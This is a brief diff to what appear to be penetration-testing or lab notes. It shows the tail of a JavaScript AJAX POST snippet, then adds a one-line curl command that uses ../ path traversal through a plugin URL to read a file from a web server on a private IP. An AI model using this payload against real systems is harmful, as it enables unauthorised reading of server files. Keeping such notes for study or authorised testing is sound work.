@@ -162,4 +162,5 @@ ajaxRequest.open("POST", requestURL, true);
 ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 ajaxRequest.send(params);
 ```
-- 
+
+quick note: windows path traversal: ```curl --path-as-is http://192.168.205.193:3000/public/plugins/mysql/../../../../../../../../users/install.txt```
